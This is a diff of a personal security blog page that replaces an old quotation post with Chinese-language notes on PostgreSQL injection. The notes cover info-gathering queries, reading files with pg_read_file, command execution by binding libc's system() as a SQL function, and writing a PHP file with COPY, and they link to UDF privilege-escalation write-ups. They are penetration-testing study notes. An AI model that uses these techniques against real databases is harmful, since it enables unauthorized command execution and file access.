@@ -20,20 +20,28 @@
     var CONFIG = {"hostname":"n0maj1o24.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
   </script>
 
-  <meta name="description" content="To be a warrior is not a simple matter of wishing to be one. It is rather an endless struggle that will go on to the very last moment of our lives. Nobody is born a warrior, in exactly the same way th">
+  <meta name="description" content="对PostgreSQL的基本操作和注入不是很了解，做一些笔记。 常用函数查看基本信息： 查看版本信息 1SELECT version();    查看当前用户 1SELECT current_user;    查看启动该sesson的用户 1SELECT session_user;    查看当前数据库 1SELECT current_database();    PostgreSQL下的IF 1">
 <meta property="og:type" content="article">
-<meta property="og:title" content="On The Way">
-<meta property="og:url" content="https://n0maj1o24.github.io/2019/08/27/On-The-Way/index.html">
+<meta property="og:title" content="PostgreSQL注入基本操作">
+<meta property="og:url" content="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/index.html">
 <meta property="og:site_name" content="Technical Memorandum">
-<meta property="og:description" content="To be a warrior is not a simple matter of wishing to be one. It is rather an endless struggle that will go on to the very last moment of our lives. Nobody is born a warrior, in exactly the same way th">
+<meta property="og:description" content="对PostgreSQL的基本操作和注入不是很了解，做一些笔记。 常用函数查看基本信息： 查看版本信息 1SELECT version();    查看当前用户 1SELECT current_user;    查看启动该sesson的用户 1SELECT session_user;    查看当前数据库 1SELECT current_database();    PostgreSQL下的IF 1">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2019-08-26T22:00:05.000Z">
-<meta property="article:modified_time" content="2021-04-22T10:19:10.194Z">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/version.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_user.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/session_user.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_database.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/case_when.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/read_file.png">
+<meta property="og:image" content="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/save.png">
+<meta property="article:published_time" content="2021-06-05T07:49:52.000Z">
+<meta property="article:modified_time" content="2021-06-05T01:11:16.990Z">
 <meta property="article:author" content="n0maj1o24">
-<meta property="article:tag" content="美文">
+<meta property="article:tag" content="PostgreSQL">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/version.png">
 
-<link rel="canonical" href="https://n0maj1o24.github.io/2019/08/27/On-The-Way/">
+<link rel="canonical" href="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/">
 
 
 <script id="page-configurations">
@@ -46,7 +54,7 @@
   };
 </script>
 
-  <title>On The Way | Technical Memorandum</title>
+  <title>PostgreSQL注入基本操作 | Technical Memorandum</title>
   
 
 
@@ -194,7 +202,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2019/08/27/On-The-Way/">
+    <link itemprop="mainEntityOfPage" href="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpeg">
@@ -207,7 +215,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          On The Way
+          PostgreSQL注入基本操作
         </h1>
 
         <div class="post-meta">
@@ -216,23 +224,17 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
+              
 
-              <time title="创建时间：2019-08-26 22:00:05" itemprop="dateCreated datePublished" datetime="2019-08-26T22:00:05Z">2019-08-26</time>
+              <time title="创建时间：2021-06-05 07:49:52 / 修改时间：01:11:16" itemprop="dateCreated datePublished" datetime="2021-06-05T07:49:52Z">2021-06-05</time>
             </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-22 10:19:10" itemprop="dateModified" datetime="2021-04-22T10:19:10Z">2021-04-22</time>
-              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E9%9A%8F%E7%AC%94/" itemprop="url" rel="index"><span itemprop="name">随笔</span></a>
+                  <a href="/categories/Penetration-Testing/" itemprop="url" rel="index"><span itemprop="name">Penetration Testing</span></a>
                 </span>
             </span>
 
@@ -252,8 +254,8 @@
       </span>
       <span class="post-meta-item-text">Valine：</span>
     
-    <a title="valine" href="/2019/08/27/On-The-Way/#valine-comments" itemprop="discussionUrl">
-      <span class="post-comments-count valine-comment-count" data-xid="/2019/08/27/On-The-Way/" itemprop="commentCount"></span>
+    <a title="valine" href="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" itemprop="commentCount"></span>
     </a>
   </span>
   
@@ -268,8 +270,55 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <p>To be a warrior is not a simple matter of wishing to be one. It is rather an endless struggle that will go on to the very last moment of our lives. Nobody is born a warrior, in exactly the same way that nobody is born an average man. We make ourselves one or the other.                                                                                                                  </p>
-<p>​                                                                                                                                                              -Carlos Casteneda -</p>
+        <p>对PostgreSQL的基本操作和注入不是很了解，做一些笔记。</p>
+<p>常用函数查看基本信息：</p>
+<p><strong>查看版本信息</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> version();</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/version.png" class="">
+
+<p><strong>查看当前用户</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">current_user</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_user.png" class="">
+
+<p><strong>查看启动该sesson的用户</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">session_user</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/session_user.png" class="">
+
+<p><strong>查看当前数据库</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> current_database();</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/current_database.png" class="">
+
+<p><strong>PostgreSQL下的IF</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CASE</span> </span><br><span class="line">      <span class="keyword">WHEN</span> condition_1  <span class="keyword">THEN</span> result_1</span><br><span class="line">      <span class="keyword">WHEN</span> condition_2  <span class="keyword">THEN</span> result_2</span><br><span class="line">      [<span class="keyword">WHEN</span> ...]</span><br><span class="line">      [<span class="keyword">ELSE</span> else_result]</span><br><span class="line"><span class="keyword">END</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/case_when.png" class="">
+
+<p><strong>读取文件</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> pg_read_file(filepath<span class="operator">+</span>filename);</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/read_file.png" class="">
+
+<p><strong>执行命令</strong></p>
+<p> Postgresql 8.2以下的版本直接调用/lib/libc.so.6或者/lib64/libc.so.6，可以执行命令：</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> <span class="keyword">system</span>(cstring) <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">language</span> C strict;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">function</span> <span class="keyword">system</span>(cstring) <span class="keyword">returns</span> <span class="type">int</span> <span class="keyword">AS</span> <span class="string">&#x27;/lib64/libc.so.6&#x27;</span>, <span class="string">&#x27;system&#x27;</span> <span class="keyword">language</span> C strict;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(<span class="string">&#x27;id&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>需要注意的是：Ubuntu中libc.so.6位于/lib/x86_64-linux-gnu目录下。高版本的系统存在安全机制无法        调用系统libc.sso.6，需要手动利用UDF进行命令执行。先查看postgresql支持的扩展语言：select *         from pg_language; Postgresql默认支持C，可以自己编译so库去创建执行命令的函数利用。</p>
+<p>当postgresql版本高于8.2存在安全机制无法调用系统libc.so.6所以需要自己利用UDF进行命令执行，具体参加下面参考文章。</p>
+<p><strong>写入文件</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">COPY</span> (<span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="keyword">to</span> <span class="string">&#x27;/tmp/1.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/save.png" class="">
+
+<p><strong>参考文章：</strong></p>
+<p><a target="_blank" rel="noopener" href="https://docs.ioin.in/writeup/www.jianfensec.com/_postgresql_getshell_html/index.html">postgresql高版本UDF提权技巧</a></p>
+<p><a target="_blank" rel="noopener" href="http://drops.xmd5.com/static/drops/tips-6449.html">Hacking PostgreSQL</a></p>
+<p>[渗透中利用postgresql getshell](<a target="_blank" rel="noopener" href="https://jianfensec.com/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B8%97%E9%80%8F%E4%B8%AD%E5%88%A9%E7%94%A8postgresql">https://jianfensec.com/渗透测试/渗透中利用postgresql</a> getshell/)</p>
+<p><a target="_blank" rel="noopener" href="https://pulsesecurity.co.nz/articles/postgres-sqli">SQL Injection and Postgres - An adventure to eventual RCE</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/PostgreSQL%20Injection.md#postgresql-blind">PostgreSQL injection</a></p>
 
     </div>
 
@@ -285,7 +334,7 @@
   </li>
   <li class="post-copyright-link">
     <strong>本文链接：</strong>
-    <a href="https://n0maj1o24.github.io/2019/08/27/On-The-Way/" title="On The Way">https://n0maj1o24.github.io/2019/08/27/On-The-Way/</a>
+    <a href="https://n0maj1o24.github.io/2021/06/05/PostgreSQL%E6%B3%A8%E5%85%A5%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/" title="PostgreSQL注入基本操作">https://n0maj1o24.github.io/2021/06/05/PostgreSQL注入基本操作/</a>
   </li>
   <li class="post-copyright-license">
     <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-nd/4.0/deed.zh" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-ND</a> 许可协议。转载请注明出处！
@@ -296,7 +345,7 @@
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/%E7%BE%8E%E6%96%87/" rel="tag"># 美文</a>
+              <a href="/tags/PostgreSQL/" rel="tag"># PostgreSQL</a>
           </div>
 
         
@@ -304,11 +353,11 @@
 
         
     <div class="post-nav">
-      <div class="post-nav-item"></div>
       <div class="post-nav-item">
-    <a href="/2020/04/20/ARM%E3%80%81MIPS%E4%BA%A4%E5%8F%89%E7%BC%96%E8%AF%91%E5%B7%A5%E5%85%B7%E8%AF%95%E7%94%A8%E5%B0%8F%E8%AE%B0/" rel="next" title="ARM、MIPS交叉编译工具试用小记">
-      ARM、MIPS交叉编译工具试用小记 <i class="fa fa-chevron-right"></i>
+    <a href="/2021/04/23/Kali%E5%AE%89%E8%A3%85Parallels-Desktop-Tools%E5%A4%B1%E8%B4%A5%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/" rel="prev" title="Kali安装Parallels Desktop Tools失败问题解决">
+      <i class="fa fa-chevron-left"></i> Kali安装Parallels Desktop Tools失败问题解决
     </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
